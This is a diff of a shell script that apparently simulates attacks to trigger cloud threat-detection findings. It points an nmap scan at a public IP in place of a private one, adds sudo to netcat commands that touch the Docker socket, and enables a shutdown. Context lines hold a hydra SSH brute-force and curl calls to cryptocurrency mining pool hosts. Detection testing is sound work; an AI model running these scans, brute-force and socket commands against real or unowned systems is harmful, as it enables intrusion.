@@ -46,7 +46,7 @@ else
 sleep 180
 # 1 - AWS simulate internal recon and attempted lateral movement
 echo "start test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-sudo nmap -sT 10.1.1.2
+sudo nmap -sT 35.243.185.19
 echo "stop test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 3 
@@ -55,7 +55,7 @@ hydra -f -l user -P /usr/share/wordlists/limitedwordlist.txt 10.1.1.3 -t 4 ssh
 echo "stop test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 4 Calling bitcoin wallets to download mining toolkits
-echo "start test 4" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+echo "start test 4" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N') 
 curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
 curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
 echo "stop test 4" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
@@ -67,8 +67,8 @@ echo "stop test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 6 - AWS PrivilegeEscalation:Runtime/DockerSocketAccessed
 echo "start test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-bash -c 'nc -lU /var/run/docker.sock &'
-echo SocketAccessed | nc -w5 -U /var/run/docker.sock
+sudo bash -c 'nc -lU /var/run/docker.sock &'
+sudo echo SocketAccessed | nc -w5 -U /var/run/docker.sock
 echo "stop test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 7 - AWS PrivilegeEscalation:Runtime/RuncContainerEscape
@@ -123,6 +123,6 @@ mv /var/log/gcp.log /var/log/gcp-"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt
 
 sleep 180
 
-#shutdown
+shutdown
 
 fi
